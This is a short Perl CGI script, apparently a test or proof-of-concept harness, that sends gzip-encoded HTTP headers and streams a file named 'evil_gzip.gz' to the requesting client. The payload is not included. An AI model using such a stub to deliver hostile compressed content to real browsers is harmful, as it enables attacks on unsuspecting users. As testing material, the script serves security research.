print "Content-Type: text/html\n";
print "Content-Encoding: gzip\n\n";

open(FILE, "<evil_gzip.gz");
while(<FILE>){print $_;}



